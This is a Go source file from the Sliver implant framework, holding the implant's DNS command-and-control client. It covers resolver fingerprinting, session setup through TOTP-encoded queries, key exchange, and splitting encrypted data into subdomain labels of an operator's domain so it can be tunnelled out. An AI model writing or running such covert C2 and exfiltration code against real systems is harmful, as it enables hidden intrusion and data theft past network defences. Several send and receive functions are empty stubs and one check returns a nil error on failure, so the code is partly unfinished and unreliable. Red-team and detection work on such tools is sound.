package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

--------------------------------------------------------------------------

*** BASE32 ***
DNS domains are limited to 254 characters including '.' so that means
Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
per subdomain.

Format: (subdata...).<ns domain>.<parent domain>
	[63].[63]...[ns].[parent].

254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query

We need to include some metadata in each request:
	Type = 2 bytes max
	ID = 4 bytes max
	Index = 4 bytes max
	Size = 4 bytes max
	Data = 78 - (2+4+4+4) ~= 64 bytes worst case

*** BASE58 ***
Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
it's just not an option, we could potentially use some type of Base62 encoding
but those implementations are more complex and only marginally more efficient
than Base58, and Base58 avoids any complexities with '-' in domain names.

The idea is that since the server returns the messages CRC32 checksum we can detect
when the message is transparently corrupted by some rude resolver. So when we init
the session we send a few messages with random data to see if we can use Base58, and
fallback to Base32 if we detect problems.
*/

// {{if .Config.DNSc2Enabled}}

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"hash/crc32"
	insecureRand "math/rand"
	"strconv"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/protobuf/dnspb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

const (
	// Little endian
	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
	metricsMaxSize   = 8
	shaveMargin      = 20 // Max metadata *should* be 18 bytes, but I added extra margin
)

var (
	errMsgTooLong          = errors.New("{{if .Config.Debug}}Too much data to encode{{end}}")
	errInvalidDNSSessionID = errors.New("{{if .Config.Debug}}Invalid dns session id{{end}}")
	errNoResolvers         = errors.New("{{if .Config.Debug}}No resolvers found{{end}}")
	ErrTimeout             = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
	ErrClosed              = errors.New("dns session closed")
)

// DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
func DNSStartSession(parent string, retryWait time.Duration, timeout time.Duration) (*SliverDNSClient, error) {
	// {{if .Config.Debug}}
	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
	// {{end}}
	client := &SliverDNSClient{
		metadata:     map[string]*ResolverMetadata{},
		parent:       "." + strings.TrimPrefix(parent, "."),
		forceBase32:  false, // Force case insensitive encoding
		queryTimeout: timeout,
		retryWait:    retryWait,
		retryCount:   3,
		closed:       true,

		// 254 is the max domain length, subtract parent length, and
		// then subtract the max number of dots we need for subdomains
		subdataSpace: 254 - len(parent) - ((254 - len(parent)) / 64),

		base32: encoders.Base32{},
		base58: encoders.Base58{},
	}
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}

// SliverDNSClient - The DNS client context
type SliverDNSClient struct {
	resolvers  []DNSResolver
	resolvConf *dns.ClientConfig
	metadata   map[string]*ResolverMetadata

	parent       string
	retryWait    time.Duration
	retryCount   int
	queryTimeout time.Duration
	forceBase32  bool
	subdataSpace int
	dnsSessionID uint32
	closed       bool

	cipherCtx *cryptography.CipherContext
	base32    encoders.Base32
	base58    encoders.Base58
}

// ResolverMetadata - Metadata for the resolver
type ResolverMetadata struct {
	Address      string
	EnableBase58 bool
	Metrics      []time.Duration
	Errors       int
}

// SessionInit - Initialize DNS session
func (s *SliverDNSClient) SessionInit() error {
	err := s.loadResolvConf()
	if err != nil {
		return err
	}
	if len(s.resolvConf.Servers) < 1 {
		// {{if .Config.Debug}}
		log.Printf("[dns] no configured resolvers!")
		// {{end}}
		return errNoResolvers
	}
	s.resolvers = []DNSResolver{}
	for _, server := range s.resolvConf.Servers {
		s.resolvers = append(s.resolvers,
			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout),
		)
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] found resolvers: %v", s.resolvConf.Servers)
	// {{end}}

	err = s.getDNSSessionID() // Get a 'dns session id'
	if err != nil {
		return err
	}
	s.fingerprintResolvers() // Fingerprint the resolvers
	if len(s.resolvers) < 1 {
		// {{if .Config.Debug}}
		log.Printf("[dns] no working resolvers!")
		// {{end}}
		return errNoResolvers
	}

	// Key agreement with server
	sKey := cryptography.RandomKey()
	s.cipherCtx = cryptography.NewCipherContext(sKey)
	initData, err := cryptography.ECCEncryptToServer(sKey[:])
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] failed to encrypt init msg %v", err)
		// {{end}}
		return err
	}
	resolver, meta := s.randomResolver()
	var encoder encoders.Encoder
	if meta.EnableBase58 {
		encoder = s.base58
	} else {
		encoder = s.base32
	}
	respData, err := s.serialSend(resolver, encoder, dnspb.DNSMessageType_SESSION_INIT, initData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg send failure %v", err)
		// {{end}}
		return err
	}
	data, err := s.cipherCtx.Decrypt(respData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg decryption failure %v", err)
		// {{end}}
		return err
	}
	if binary.LittleEndian.Uint32(data)&sessionIDBitMask != s.dnsSessionID {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg dns session id mismatch")
		// {{end}}
		return err
	}

	// Good to go!
	// {{if .Config.Debug}}
	log.Printf("[dns] key exchange was successful!")
	// {{end}}

	return nil
}

// WriteEnvelope - Send an envelope to the server
func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.closed {
		return ErrClosed
	}
	return nil
}

// ReadEnvelope - Recv an envelope from the server
func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.closed {
		return nil, ErrClosed
	}
	return nil, nil
}

// serialSend - send a message serially (generally only used for init)
func (s *SliverDNSClient) serialSend(resolver DNSResolver, encoder encoders.Encoder, msgType dnspb.DNSMessageType, data []byte) ([]byte, error) {
	msg := &dnspb.DNSMessage{
		ID:   s.msgID(0),
		Type: msgType,
		Size: uint32(len(data)),
	}

	allSubdata, err := s.splitBuffer(msg, encoder, s.subdataSpace, data)
	if err != nil {
		return nil, err
	}
	for _, subdata := range allSubdata {
		_, _, err := resolver.TXT(subdata)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dns] init msg failure %v", err)
			// {{end}}
			return nil, err
		}
	}
	return nil, nil
}

func (s *SliverDNSClient) send(data []byte) error {

	return nil
}

func (s *SliverDNSClient) recv() ([]byte, error) {

	return nil, nil
}

// There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
// and check the length until we hit the limit
func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, maxLength int, data []byte) ([]string, error) {
	subdata := []string{}
	start := 0
	stop := start
	var encoded string
	for index := 0; stop < len(data); index++ {
		msg.Index = uint32(index)
		stop += (maxLength - shaveMargin) // MaxLength - max length of pb metadata
		if len(data) < stop {
			stop = len(data) - 1 // make sure the loop is executed at least once
		}
		for len(encoded) < maxLength-1 && stop < len(data) {
			stop++
			// {{if .Config.Debug}}
			log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
			// {{end}}
			msg.Data = data[start:stop]
			pbMsg, _ := proto.Marshal(msg)
			encoded = string(encoder.Encode(pbMsg))
			// {{if .Config.Debug}}
			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), maxLength)
			// {{end}}
		}
		domain, err := s.joinSubdata(encoded)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dns] join subdata failed: %s", err)
			// {{end}}
			return nil, err
		}
		subdata = append(subdata, domain)
		start = stop
	}
	return subdata, nil
}

func (s *SliverDNSClient) getDNSSessionID() error {
	otpMsg, err := s.otpMsg()
	if err != nil {
		return err
	}
	otpDomain, err := s.joinSubdata(string(s.base32.Encode(otpMsg)))
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
	// {{end}}

	var a []byte
	for _, resolver := range s.resolvers {
		a, _, err = resolver.A(otpDomain)
		if err == nil {
			break
		}
	}
	if err != nil {
		return err // All resolvers failed
	}
	if len(a) < 1 {
		return errInvalidDNSSessionID
	}
	s.dnsSessionID = binary.LittleEndian.Uint32(a) & sessionIDBitMask
	if s.dnsSessionID == 0 {
		return errInvalidDNSSessionID
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] dns session id: %d", s.dnsSessionID)
	// {{end}}
	return nil
}

func (s *SliverDNSClient) loadResolvConf() error {
	var err error
	s.resolvConf, err = dnsClientConfig()
	return err
}

func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
	if s.subdataSpace <= len(subdata) {
		return "", errMsgTooLong // For sure won't fit after we add '.'
	}
	subdomains := []string{}
	for index := 0; index < len(subdata); index += 63 {
		stop := index + 63
		if len(subdata) < stop {
			stop = len(subdata)
		}
		subdomains = append(subdomains, subdata[index:stop])
	}
	// s.parent already has a leading '.'
	domain := strings.Join(subdomains, ".") + s.parent
	if 254 < len(domain) {
		return "", errMsgTooLong
	}
	return domain, nil
}

func (s *SliverDNSClient) otpMsg() ([]byte, error) {
	otpCode := cryptography.GetOTPCode()
	otp, err := strconv.Atoi(otpCode)
	if err != nil {
		return nil, err
	}
	otpMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_TOTP,
		ID:   uint32(otp), // Take advantage of the variable length encoding
	}
	return proto.Marshal(otpMsg)
}

// fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
func (s *SliverDNSClient) fingerprintResolvers() {
	wg := &sync.WaitGroup{}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fingerprinting %d resolver(s) ...", len(s.resolvers))
	// {{end}}
	results := make(chan *ResolverMetadata)
	for id, resolver := range s.resolvers {
		wg.Add(1)
		go s.fingerprintResolver(id, wg, results, resolver)
	}
	done := make(chan struct{})
	go func() {
		for result := range results {
			s.metadata[result.Address] = result
		}
		done <- struct{}{}
	}()
	wg.Wait()
	close(results)
	<-done // Ensure the result collection goroutine is done

	// {{if .Config.Debug}}
	for _, result := range s.metadata {
		log.Printf("[dns] %s: avg rtt %s, base58: %v, errors %d",
			result.Address, s.averageRtt(result), result.EnableBase58, result.Errors)
	}
	// {{end}}

	// NOTE: In the future we may want to add a configurable error threshold for now
	// if we encounter any errors we don't use the resolver.
	workingResolvers := []DNSResolver{}
	for _, resolver := range s.resolvers {
		meta := s.metadata[resolver.Address()]
		if 0 < meta.Errors {
			// {{if .Config.Debug}}
			log.Printf("[dns] WARNING: removing resolver %s (too many errors)", resolver.Address())
			// {{end}}
			continue
		}
		workingResolvers = append(workingResolvers, resolver)
	}
	s.resolvers = workingResolvers
}

// Fingerprints a single resolver to determine if we can use a case sensitive encoding, average
// round trip time, and if it works at all
func (s *SliverDNSClient) fingerprintResolver(id int, wg *sync.WaitGroup, results chan<- *ResolverMetadata, resolver DNSResolver) {
	defer wg.Done()
	meta := &ResolverMetadata{
		Address:      resolver.Address(),
		EnableBase58: false,
		Metrics:      []time.Duration{},
		Errors:       0,
	}
	s.benchmark(id, s.base32, resolver, meta)
	if meta.Errors == 0 && !s.forceBase32 {
		s.benchmark(id, s.base58, resolver, meta)
		if meta.Errors == 0 {
			meta.EnableBase58 = true
		} else {
			meta.EnableBase58 = false
			meta.Errors = 0 // Reset base32 error count
		}
	}
	results <- meta
}

func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver DNSResolver, meta *ResolverMetadata) {
	for index := 0; index < metricsMaxSize/2; index++ {
		finger, fingerChecksum, err := s.fingerprintMsg(id)
		if err != nil {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] failed to marshal fingerprint msg: %v", id, err)
			// {{end}}
			continue
		}
		domain, err := s.joinSubdata(string(encoder.Encode(finger)))
		if err != nil {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] failed to encode subdata: %s", id, err)
			// {{end}}
			continue
		}
		data, rtt, err := resolver.A(domain)
		if err != nil || len(data) < 1 {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] resolver failed: %s", id, err)
			// {{end}}
			continue
		}

		if fingerChecksum != binary.LittleEndian.Uint32(data) {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] error checksum mismatch expected: %d, got: %d",
				id, fingerChecksum, binary.LittleEndian.Uint32(data))
			// {{end}}
			continue
		}
		s.recordMetrics(meta, rtt)
	}
}

func (s *SliverDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
	data := make([]byte, 8)
	rand.Read(data)
	fingerprintMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_NOP,
		ID:   s.msgID(uint32(id)), // Take advantage of the variable length encoding
		Data: data,
	}
	msg, err := proto.Marshal(fingerprintMsg)
	return msg, crc32.ChecksumIEEE(msg), err
}

// msgID - Combine (bitwise-OR) DNS session ID with message ID
func (s *SliverDNSClient) msgID(id uint32) uint32 {
	return uint32(id<<24) | uint32(s.dnsSessionID)
}

// WARNING: The metrics map is not mutex'd so you cannot modify it in this
// method since it'll be executed in a goroutine. The map should already be
// setup for us so any key error here should panic
func (s *SliverDNSClient) recordMetrics(meta *ResolverMetadata, rtt time.Duration) {
	// Prepend metrics slice, drop oldest if we have more than metricsMaxSize
	if len(meta.Metrics) < metricsMaxSize {
		meta.Metrics = append([]time.Duration{rtt}, meta.Metrics...)
	} else {
		meta.Metrics = append([]time.Duration{rtt}, meta.Metrics[:metricsMaxSize-1]...)
	}
}

func (s *SliverDNSClient) averageRtt(meta *ResolverMetadata) time.Duration {
	if len(meta.Metrics) < 1 {
		return time.Duration(0)
	}
	var sum time.Duration
	for _, rtt := range meta.Metrics {
		sum += rtt
	}
	return time.Duration(int64(sum) / int64(len(meta.Metrics)))
}

func (s *SliverDNSClient) randomResolver() (DNSResolver, *ResolverMetadata) {
	resolver := s.resolvers[insecureRand.Intn(len(s.resolvers))]
	return resolver, s.metadata[resolver.Address()]
}

// {{end}} -DNSc2Enabled
